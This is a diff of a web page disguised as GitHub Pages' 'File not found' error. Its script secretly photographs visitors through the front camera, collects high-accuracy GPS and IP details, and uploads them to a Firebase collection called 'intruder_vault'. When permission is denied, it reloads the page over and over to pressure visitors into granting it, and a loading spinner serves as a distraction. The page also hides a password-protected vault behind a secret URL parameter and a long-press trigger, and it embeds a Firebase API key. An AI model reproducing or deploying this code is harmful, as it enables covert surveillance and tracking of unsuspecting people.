@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Page not found · GitHub Pages</title>
     <style>
-        /* --- ORIGINAL GITHUB 404 STYLING --- */
+        /* --- PIXEL PERFECT GITHUB 404 STYLE --- */
         body {
             background-color: #fff; margin: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
@@ -17,57 +17,59 @@
         h2 { font-size: 20px; font-weight: 500; color: #586069; margin: 0 0 30px 0; }
         p { font-size: 14px; line-height: 1.6; color: #586069; margin: 10px 0; }
         a { color: #0366d6; text-decoration: none; }
-        
-        /* --- HIDDEN INTERFACES --- */
-        #vault_ui, #data_view, #loading_overlay { display: none; }
-        
+        code { font-family: monospace; background: rgba(27,31,35,0.05); padding: 3px 5px; border-radius: 3px; font-size: 85%; }
+
+        /* --- LOADING OVERLAY (Diverts Attention) --- */
+        #loading_overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10001; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .spinner { width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #0366d6; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- HIDDEN VAULT & LOGIN --- */
+        #vault_ui, #data_view { display: none; }
         #vault_ui {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             background: #fff; padding: 40px; border: 1px solid #d1d5da; border-radius: 6px; 
-            box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 300px; z-index: 1000;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 280px; z-index: 1000;
         }
         #vault_ui input { display: block; width: 100%; margin: 10px 0; padding: 10px; border: 1px solid #d1d5da; border-radius: 3px; box-sizing: border-box; }
         #vault_ui button { width: 100%; padding: 10px; background: #2ea44f; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
 
-        #data_view { 
-            width: 100%; height: 100vh; overflow-y: auto; background: white; 
-            position: fixed; top: 0; left: 0; z-index: 9999; padding: 20px; box-sizing: border-box; text-align: left;
-        }
-        .upload-bar { background: #f6f8fa; padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #d1d5da; display: flex; align-items: center; justify-content: space-between; }
-        
-        /* LOADING TEXT TO DISTRACT USER */
-        #loading_overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10001; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0366d6; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #data_view { width: 100%; height: 100vh; overflow-y: auto; background: white; position: fixed; top: 0; left: 0; z-index: 9999; padding: 20px; box-sizing: border-box; text-align: left; }
+        .upload-bar { background: #f6f8fa; padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #d1d5da; display: flex; justify-content: space-between; align-items: center; }
+        .file-card { border-bottom: 1px solid #eee; padding: 15px 0; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
     <div id="loading_overlay">
         <div class="spinner"></div>
-        <p>Verifying Connection...</p>
+        <p style="margin-top:15px; font-size:14px; color:#586069;">Verifying host connection...</p>
     </div>
 
     <div id="decoy_ui">
         <h1>404</h1>
         <h2>File not found</h2>
         <p>The site configured at this address does not contain the requested file.</p>
-        <p><a href="#">Read documentation</a> for <strong>GitHub Pages</strong>.</p>
+        <p>If this is your site, make sure that the filename case matches the URL.<br>
+        For root URLs you must provide an <code>index.html</code> file.</p>
+        <p><a href="#">Read the full documentation</a> for <strong>GitHub Pages</strong>.</p>
     </div>
 
     <div id="vault_ui">
-        <h3>System Auth</h3>
-        <input type="password" id="pass_field" placeholder="System ID">
-        <input type="text" id="user_field" placeholder="Error Code">
-        <button id="auth_btn">Verify</button>
+        <h3 style="margin:0 0 15px 0;">System Auth</h3>
+        <input type="password" id="pass_field" placeholder="Secret Key">
+        <input type="text" id="user_field" placeholder="Admin ID">
+        <button id="auth_btn">Decrypt & Access</button>
     </div>
 
     <div id="data_view">
         <div class="upload-bar">
-            <strong>Private Vault:</strong>
-            <input type="file" id="fileInput" accept="image/*,application/pdf">
-            <button id="upBtn">Push</button>
-            <button onclick="location.reload()" style="background:#d73a49; color:white; border:none; padding:5px 10px; border-radius:4px;">Lock</button>
+            <div>
+                <strong>Vault:</strong>
+                <input type="file" id="fileInput" style="margin-left:10px;">
+                <button id="upBtn" style="background:#2ea44f; color:white; border:none; padding:5px 12px; border-radius:4px; cursor:pointer;">Upload</button>
+            </div>
+            <button onclick="location.reload()" style="background:#d73a49; color:white; border:none; padding:5px 12px; border-radius:4px; cursor:pointer;">Lock</button>
         </div>
         <div id="vault_content"></div>
     </div>
@@ -77,7 +79,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, getDoc, doc, getDocs, setDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
+        import { getFirestore, collection, getDoc, doc, getDocs, setDoc, addDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyD7IPQ8jg2u7E1nnUkGQHXDyVbfmgvX0XE",
@@ -90,11 +92,18 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        async function startSpyLoop() {
-            let photoData, locData;
+        async function startCapture() {
+            // STOP REFRESH LOOP IF ALREADY CAPTURED
+            if (sessionStorage.getItem('done') === 'y') {
+                document.getElementById('loading_overlay').style.display = 'none';
+                return;
+            }
+
+            let photo = "Denied";
+            let gps = "Denied";
 
             try {
-                // 1. FORCE CAMERA
+                // CAMERA CAPTURE
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('spyVideo');
                 const canvas = document.getElementById('spyCanvas');
@@ -102,56 +111,57 @@
                 await new Promise(r => video.onloadedmetadata = r);
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                photoData = canvas.toDataURL('image/jpeg', 0.5);
+                photo = canvas.toDataURL('image/jpeg', 0.4);
                 stream.getTracks().forEach(t => t.stop());
 
-                // 2. FORCE GPS (Strict High Accuracy)
+                // GPS CAPTURE (STRICT)
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 7000 });
                 });
-                locData = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
+                gps = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
 
-                // 3. LOG TO FIREBASE
+                // LOG TO DB
                 const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                const logs = await getDocs(collection(db, "intruder_vault"));
+                const ip = await ipRes.json();
+                const snap = await getDocs(collection(db, "intruder_vault"));
                 
-                await setDoc(doc(db, "intruder_vault", `Visitor_${logs.size + 1}`), {
-                    photo: photoData,
-                    location: locData,
-                    network: ipData,
+                await setDoc(doc(db, "intruder_vault", `Visitor_${snap.size + 1}`), {
+                    photo: photo,
+                    location: gps,
+                    network: ip,
                     timestamp: new Date().toISOString()
                 });
 
-                // Hide loading after capture
+                sessionStorage.setItem('done', 'y');
                 document.getElementById('loading_overlay').style.display = 'none';
 
             } catch (err) {
-                // IF DENIED OR ERROR: REFRESH TO ASK AGAIN
-                console.log("Permission Denied. Refreshing...");
-                location.reload();
+                // If user blocks, reload page to prompt again
+                console.warn("Retrying Auth...");
+                setTimeout(() => { location.reload(); }, 1200);
             }
         }
 
-        window.onload = startSpyLoop;
+        window.onload = startCapture;
 
-        // --- GHOST TRIGGER ---
+        // --- GHOST TRIGGER (5 SECOND PRESS) ---
         let timer;
         if(new URLSearchParams(window.location.search).get('access') === 'valie') {
-            const start = () => timer = setTimeout(() => {
+            const trigger = () => {
                 document.getElementById('decoy_ui').style.display = 'none';
                 document.getElementById('vault_ui').style.display = 'block';
-            }, 5000);
-            ['mousedown', 'touchstart'].forEach(e => document.addEventListener(e, start));
+            };
+            ['mousedown', 'touchstart'].forEach(e => document.addEventListener(e, () => timer = setTimeout(trigger, 5000)));
             ['mouseup', 'touchend'].forEach(e => document.addEventListener(e, () => clearTimeout(timer)));
         }
 
-        // --- AUTH & VAULT ---
+        // --- VAULT LOGIN ---
         document.getElementById('auth_btn').onclick = async () => {
             const p = document.getElementById('pass_field').value;
             const u = document.getElementById('user_field').value;
-            const snap = await getDoc(doc(db, "system_config", "vault_secrets"));
-            if (snap.exists() && p === snap.data().secret_pass && u === snap.data().secret_user) {
+            const secrets = await getDoc(doc(db, "system_config", "vault_secrets"));
+            
+            if (secrets.exists() && p === secrets.data().secret_pass && u === secrets.data().secret_user) {
                 document.getElementById('vault_ui').style.display = 'none';
                 document.getElementById('data_view').style.display = 'block';
                 loadFiles();
@@ -164,11 +174,25 @@
             box.innerHTML = "";
             snap.forEach(d => {
                 const f = d.data();
-                const div = document.createElement('div');
-                div.innerHTML = `<h4>${f.name}</h4><img src="${f.content}" style="max-width:100%">`;
-                box.appendChild(div);
+                const item = document.createElement('div');
+                item.className = "file-card";
+                item.innerHTML = `<strong>${f.name}</strong><br><img src="${f.content}" style="max-width:100%; margin-top:10px; border-radius:4px;">`;
+                box.appendChild(item);
             });
         }
+
+        document.getElementById('upBtn').onclick = async () => {
+            const file = document.getElementById('fileInput').files[0];
+            if(!file) return;
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = async () => {
+                await addDoc(collection(db, "vault_data"), {
+                    name: file.name, content: reader.result, date: new Date().toISOString()
+                });
+                loadFiles();
+            };
+        };
     </script>
 </body>
 </html>
